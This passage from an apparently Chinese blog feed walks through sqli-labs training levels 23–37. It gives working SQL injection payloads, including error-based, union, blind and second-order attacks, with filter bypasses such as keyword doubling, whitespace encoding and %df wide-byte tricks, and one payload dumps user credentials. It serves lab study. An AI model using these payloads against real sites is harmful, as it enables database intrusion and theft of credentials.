    <content type="html"><![CDATA[<p>第二部分来啦~~</p><span id="more"></span><h1 id="Less-23-注释符绕过"><a href="#Less-23-注释符绕过" class="headerlink" title="Less-23 注释符绕过"></a>Less-23 注释符绕过</h1><p>输入1’出现如下报错信息:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">''</span>1<span class="token string">''</span> LIMIT 0,1' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可猜测源码中可能为’$id’</p><p>当构造id=1’ and ‘1’=’1 时正常,而id=1’ and ‘1’=’1’#或者id=1’ and ‘1’=’1’–+ 时报错，发现是对#和–+等注释符进行了过滤。</p><p>注释符绕过只能构造一个单引号来闭合后面的但引号。</p><h3 id="利用报错注入："><a href="#利用报错注入：" class="headerlink" title="利用报错注入："></a>利用报错注入：</h3><h3 id="23-1获取数据库用户名"><a href="#23-1获取数据库用户名" class="headerlink" title="23.1获取数据库用户名"></a>23.1获取数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select user()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/23.png" class></p><h3 id="23-2获取数据库名"><a href="#23-2获取数据库名" class="headerlink" title="23.2获取数据库名"></a>23.2获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/23_2.png" class></p><p>或者使用：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and info() and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/fb8a/23_3.png" class></p><h3 id="23-3获取表名"><a href="#23-3获取表名" class="headerlink" title="23.3获取表名"></a>23.3获取表名</h3><p>其实我报错函数我比较喜欢用updatexml()，但是呢，当它只能显示32长度的内容，绕过获取的内容超过32字符就要采用字符串截取的方式。然后每次获取32字符串的内容。</p><p>比如：</p><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,31) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/23_4.png" class></p><p>然后接着获取：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),32,62) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/fb8a/23_5.png" class><p>啊还有一小节，再来一个：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),63,93) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/fb8a/23_6.png" class></p><p>好了，完工。</p><p>其实吧，该说不说，上面这种可能直接手工注入的时候会容易记忆一点，但如果要写成测试脚本的话，就还是使用floor()函数，比较好：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and (select count(*) from information_schema.tables group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2))) and '</span>1<span class="token string">'='</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>好的，亏我以为floor()函数能一次性查出来所有的，原来也只能查到64字节，那剩下的字节就还是用substr()函数查出来吧。</p><p> <img src="/posts/fb8a/23_7.png" class></p><h1 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24 二次注入"></a>Less-24 二次注入</h1><p>本关为二次注入。</p><p>二次注入含义：将可能导致sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</p><p>大致原理：先创建一个用户admin’#,再登录这个账号修改密码。原来的密码那里可以任意输，新密码自己设定。修改完成后会发现成功修改了已有账号admin的密码。</p><h3 id="24-1先创建一个admin’-的账号"><a href="#24-1先创建一个admin’-的账号" class="headerlink" title="24.1先创建一个admin’#的账号"></a>24.1先创建一个admin’#的账号</h3><p> <img src="/posts/fb8a/24.png" class></p><h3 id="24-2登录admin’-的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。"><a href="#24-2登录admin’-的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。" class="headerlink" title="24.2登录admin’#的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。"></a>24.2登录admin’#的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。</h3><p>在源代码中的sql语句为：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='<span class="token variable">$pass</span>' where username='<span class="token variable">$username</span>' and password='<span class="token variable">$curr_pass</span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即如果我们修改admin’#的密码会变成：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> "UPDATE <span class="token function">users</span> SET PASSWORD<span class="token operator">=</span><span class="token string">'<span class="token variable">$pass</span>'</span> where username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment" spellcheck="true">#' and password='$curr_pass' ";</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我们就可以变成修改admin的密码了。</p><p> <img src="/posts/fb8a/24_2.png" class></p><h3 id="24-3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456"><a href="#24-3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456" class="headerlink" title="24.3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456"></a>24.3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456</h3><p> <img src="/posts/fb8a/23_3.png" class></p><h1 id="and和or绕过-Less-25-Less25a"><a href="#and和or绕过-Less-25-Less25a" class="headerlink" title="and和or绕过(Less-25~Less25a)"></a>and和or绕过(Less-25~Less25a)</h1><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>本关对or和and进行了过滤。要绕过or和and，构造其他的注入语句。</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>尝试双写绕过。即双写关键字，可将and写为anandd，or写成oorr,发现成功绕过了耶。</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>可尝试将and替换成&amp;&amp;，or替换成||。这里我试了一下用||可以，但&amp;&amp;不可以，因为&amp;在数据包里面相当于里面的参数连接符，可以将&amp;&amp;进行url编码成%26%26使用。</p><h3 id="这里采用双写绕过并利用报错注入："><a href="#这里采用双写绕过并利用报错注入：" class="headerlink" title="这里采用双写绕过并利用报错注入："></a>这里采用双写绕过并利用报错注入：</h3><h4 id="①获取数据库用户名"><a href="#①获取数据库用户名" class="headerlink" title="①获取数据库用户名"></a>①获取数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' anandd updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/fb8a/25.png" class><h4 id="②获取数据库名"><a href="#②获取数据库名" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1' anandd info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/25_2.png" class></p><p>或者使用：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' anandd updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/fb8a/25_3.png" class></p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>本关错误时不会显示错在哪里了，所以不能采用报错注入。并且也对and和or进行了过滤。</p><p>当使用id=1 || 1=1出现正确信息，说明在源码中id=$id。</p><p>可以使用延时注入和布尔盲注。</p><h3 id="这里还是用anandd双写来代替and-下面采用基于布尔的盲注："><a href="#这里还是用anandd双写来代替and-下面采用基于布尔的盲注：" class="headerlink" title="这里还是用anandd双写来代替and,下面采用基于布尔的盲注："></a>这里还是用anandd双写来代替and,下面采用基于布尔的盲注：</h3><h4 id="①获取数据库用户名-1"><a href="#①获取数据库用户名-1" class="headerlink" title="①获取数据库用户名"></a>①获取数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1 anandd substr<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当字母正确时，会出现正确的页面，当字母不正确时，会出现不正确的页面。也可以用burp抓包，对substr的第一个1和字母a进行爆破。</p><h4 id="②获取数据库名-1"><a href="#②获取数据库名-1" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1 anandd substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当字母正确时，会出现正确的页面，当字母不正确时，会出现不正确的页面。也可以用burp抓包，对substr的第一个1和字母a进行爆破。</p><p> <img src="/posts/fb8a/25a.png" class></p><h1 id="空格字符绕过-Less-26-Less26a"><a href="#空格字符绕过-Less-26-Less26a" class="headerlink" title="空格字符绕过(Less-26~Less26a)"></a>空格字符绕过(Less-26~Less26a)</h1><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>本关将or,and,空格,/*,#,–,/等各种字符就进行了过滤。</p><p>空格字符绕过：</p><pre class="line-numbers language-bash"><code class="language-bash">%20 %09 %0a %0b %0c %0d %a0 /**/ +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="本关可以用报错注入："><a href="#本关可以用报错注入：" class="headerlink" title="本关可以用报错注入："></a>本关可以用报错注入：</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1<span class="token string">'+||+updatexml(1,concat(0x7e,user(),0x7e),1)+||+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/26.png" class></p><h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">'+||+info()+||+'</span>1或者id<span class="token operator">=</span>1<span class="token string">'+||+updatexml(1,concat(0x7e,database(),0x7e),1)+||+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/26_2.png" class></p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关过滤的字符跟第二十六关一样，闭合方式是’) 并且不能用报错注入了，因为不会显示错在哪里了。可以采用union联合注入或盲注。</p><h3 id="下面采用union联合注入："><a href="#下面采用union联合注入：" class="headerlink" title="下面采用union联合注入："></a>下面采用union联合注入：</h3><h4 id="①获得数据库名"><a href="#①获得数据库名" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,database(),3+||('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里的999为一个不存在的值，%0b可以用%a0代替，其他不行，可能是系统问题。</p><p>  <img src="/posts/fb8a/26a.png" class></p><h4 id="②获得用户名"><a href="#②获得用户名" class="headerlink" title="②获得用户名"></a>②获得用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,user(),3+||('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/26a_2.png" class></p><h4 id="③获得表名"><a href="#③获得表名" class="headerlink" title="③获得表名"></a>③获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()||('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/26a_3.png" class></p><h1 id="union和select绕过-Less-27-Less-28a"><a href="#union和select绕过-Less-27-Less-28a" class="headerlink" title="union和select绕过(Less-27~Less-28a)"></a>union和select绕过(Less-27~Less-28a)</h1><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>本关主要是union、select字符和26关过滤掉的字符。</p><p>如果要用到union和select的话，可以使用大小写混写或者双写关键字绕过。</p><h3 id="可以采用报错注入："><a href="#可以采用报错注入：" class="headerlink" title="可以采用报错注入："></a>可以采用报错注入：</h3><h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">'+and%a0updatexml(1,concat(0x7e,user(),0x7e),1)+and+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/27.png" class></p><h4 id="②获得数据库名："><a href="#②获得数据库名：" class="headerlink" title="②获得数据库名："></a>②获得数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1<span class="token string">'+and%a0info()+and+'</span>1或者id<span class="token operator">=</span>1<span class="token string">'+and%a0updatexml(1,concat(0x7e,database(),0x7e),1)+and+'</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/27_2.png" class></p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>本关过滤的字符跟第二十七关一样，闭合方式为”并且不能采用报错注入了。</p><h3 id="可以采用union联合注入（union和select大小写混写）："><a href="#可以采用union联合注入（union和select大小写混写）：" class="headerlink" title="可以采用union联合注入（union和select大小写混写）："></a>可以采用union联合注入（union和select大小写混写）：</h3><h4 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0SeLect%a01,user(),3+||+"</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/27a.png" class></p><h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0SeLect%a01,database(),3+||+"</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/fb8a/27a_2.png" class><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>本关第二十七差不多,只是闭合的方式是’)</p><h4 id="①获取数据库名："><a href="#①获取数据库名：" class="headerlink" title="①获取数据库名："></a>①获取数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">') union%a0select%a01,database(),3+||+('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/28.png" class></p><h4 id="②获得数据库用户名"><a href="#②获得数据库用户名" class="headerlink" title="②获得数据库用户名"></a>②获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>999<span class="token string">') union%a0select%a01,user(),3+||+('</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/fb8a/28_2.png" class></p><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>用第二十八关的payload一样可以</p><h1 id="HPP-HTTP-Parameter-Pollution-，http-参数污染-Less29-Less-31"><a href="#HPP-HTTP-Parameter-Pollution-，http-参数污染-Less29-Less-31" class="headerlink" title="HPP(HTTP Parameter Pollution)，http 参数污染(Less29~Less-31)"></a>HPP(HTTP Parameter Pollution)，http 参数污染(Less29~Less-31)</h1><p>这三关是要搭建环境才能实现的。好像要在Ubuntu下，并且要下载tomcat，jdk等等。想了想，了解下原理，还是在PHP环境下绕过得了。</p><p>这里的两层架构的工作流程为：</p><p>client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p><p>这里需要注意的就是：</p><p>index.php?id=1&amp;id=2,在Apache(php)解析最后一个参数，Tomcat(jsp)解析第一个参数。那先经过Tomcat再到Apache的也是显示最后一个参数。</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>这里使用一个单引号报错，使用两个单引号正常。</p><h3 id="（1）直接用报错注入"><a href="#（1）直接用报错注入" class="headerlink" title="（1）直接用报错注入"></a>（1）直接用报错注入</h3><h4 id="①得到数据库用户名"><a href="#①得到数据库用户名" class="headerlink" title="①得到数据库用户名"></a>①得到数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29.png" class></p><h4 id="②获取数据库名-2"><a href="#②获取数据库名-2" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_2.png" class> </p><h3 id="（2）使用联合注入"><a href="#（2）使用联合注入" class="headerlink" title="（2）使用联合注入"></a>（2）使用联合注入</h3><p>其实吧，我一般不怎么用union，因为还要先判断字段和注入点。好久没用了，还是用一下吧。</p><h4 id="①先判断有几个字段"><a href="#①先判断有几个字段" class="headerlink" title="①先判断有几个字段"></a>①先判断有几个字段</h4><p>当输到id=1’ order by 4–+时报错，说明有三个字段</p><h4 id="②找注入点"><a href="#②找注入点" class="headerlink" title="②找注入点"></a>②找注入点</h4><p>id=-1’ union select  1,2,3–+</p><p>可以看到在2,3的位置都可以写注入语句。</p><p>  <img src="/posts/fb8a/29_3.png" class></p><h4 id="③构造union语句"><a href="#③构造union语句" class="headerlink" title="③构造union语句"></a>③构造union语句</h4><h3 id="29-1获得数据库用户名"><a href="#29-1获得数据库用户名" class="headerlink" title="29.1获得数据库用户名"></a>29.1获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,user<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_4.png" class></p><h3 id="29-2获得数据库名"><a href="#29-2获得数据库名" class="headerlink" title="29.2获得数据库名"></a>29.2获得数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_5.png" class></p><h3 id="29-3获得表名"><a href="#29-3获得表名" class="headerlink" title="29.3获得表名"></a>29.3获得表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_6.png" class></p><h3 id="29-4获得字段名"><a href="#29-4获得字段名" class="headerlink" title="29.4获得字段名"></a>29.4获得字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1<span class="token string">' union select  1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/fb8a/29_7.png" class></p><h3 id="29-5获取用户名和密码"><a href="#29-5获取用户名和密码" class="headerlink" title="29.5获取用户名和密码"></a>29.5获取用户名和密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/fb8a/29_8.png" class><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>这一关不显示报错信息，不能用报错注入了，但还是可以用union联合注入的，payload跟第二十九的一样，只需要将第二十九关的union联合注入的’换成”即可</p><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>这关跟二十九关也一样，只需要将’换成”)即可，对于报错注入和union联合注入都能用。</p><h1 id="宽字节注入-Less-32-Less-37"><a href="#宽字节注入-Less-32-Less-37" class="headerlink" title="宽字节注入(Less-32~Less-37)"></a>宽字节注入(Less-32~Less-37)</h1><p>这几关是针对’和\的过滤。在这里，会将’转换为&#39;</p><p>宽字节注入产生的原因：数据库编码与PHP编码设置为不同的两个编码。</p><p>Big5和GBK字符集有可能会存在宽字节注入，utf-8和gb2312没有。Mysql在使用GBK编码时，会认为两个字符为一个汉字。</p><p>思路一：%df吃掉\ 原因在于urldecode(‘)=%5c%27,而我们在前面添加%df，就形成了%df%5c%27,mysql在GBK编码中前两个字当做一个汉字，此时%27就会作为一个单独的字符，也就是’</p><p>思路二：将&#39;中的\过滤掉。可以构造%**%5c%5c%27，后面的%5c会被前面的%5c给注释掉。</p><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>本关将’转换为&#39;，我们利用%df消掉生成的那个\。</p><h3 id="采用报错注入："><a href="#采用报错注入：" class="headerlink" title="采用报错注入："></a>采用报错注入：</h3><h4 id="①获得数据库名-1"><a href="#①获得数据库名-1" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1%df<span class="token string">' and updatexml(1,concat(0x7e,user(),0x7e),1)--+或者id=1%df'</span> and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="②获得数据库用户名-1"><a href="#②获得数据库用户名-1" class="headerlink" title="②获得数据库用户名"></a>②获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1%df' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>本关的payload和第三十二关一样。</p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>本关是post型的注入。</p><p>这里不能用%df绕过了，因为这里不是get方式不会经过urldecode，可以考虑将utf-8转换成utf-16。例如将’转为utf-16为�’</p><h3 id="然后可以采用报错注入："><a href="#然后可以采用报错注入：" class="headerlink" title="然后可以采用报错注入："></a>然后可以采用报错注入：</h3><p>在用户框输入payload:</p><pre class="line-numbers language-bash"><code class="language-bash">1�' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可获得数据库用户名。</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>本关源码中id=$id，所以不用输单引号，也就不用考虑单引号转义的问题了。</p><h3 id="采用union联合注入"><a href="#采用union联合注入" class="headerlink" title="采用union联合注入"></a>采用union联合注入</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> 1,2,user<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即可获得数据库用户名</p><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>本关还是可以用%df绕过，payload和第三十二关一样。</p><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>本关一样可以将单引号转换为utf-16，payload和第三十四关一样。</p>]]></content>
    
    
    <categories>
      
      <category>专项靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>Web漏洞</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli靶场(1~22关)</title>
    <link href="/posts/bb32.html"/>
    <url>/posts/bb32.html</url>
    
    <content type="html"><![CDATA[<p>又是疯狂打靶场的一天，这个sqli靶场真的好多关，我之前试过打过几关，没有坚持，但万事开头难，总归是慢慢打完了。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一部分就是union联合注入和盲注。</p><p>我这里用的sqli靶场是<a href="https://github.com/Audi-1/sqli-labs.git">https://github.com/Audi-1/sqli-labs.git</a> sqli-labs</p><p>把第一部分打完，你真的就成功一大半了~</p><h2 id="union操作符："><a href="#union操作符：" class="headerlink" title="union操作符："></a>union操作符：</h2><p>UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列的顺序必须相同</p><p>注释：默认地，UNION操作符选取不同的值。如果允许重复的值，请使用UNION ALL</p><h2 id="Limit："><a href="#Limit：" class="headerlink" title="Limit："></a>Limit：</h2><p>Limit是指限定查询的条数。有三种方式：</p><pre class="line-numbers language-bash"><code class="language-bash">方式一：limit 参数1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数1可从1开始，往后递增，表示要查询几条数据。</p><p>例如，limit 1 表示限定查询一条语句。</p><pre class="line-numbers language-bash"><code class="language-bash">方式二：limit 参数1，参数2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数1从0开始，表示从第几行（按照索引0作第一行）开始查询，参数2表示要查询的条数。合在一起的意思就是，从参数1开始，查询参数2条语句。</p><p>例如，limit 0,1 表示查询第一条语句，和limit 1等意。</p><pre class="line-numbers language-bash"><code class="language-bash">方式三：limit 参数1 offset 参数2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数1表示限定要查询几条，参数2表示从第几行（按照索引为0作第一行）开始查询。</p><p>例如：limit 1 offset 0 表示查询第一条参数。</p><h1 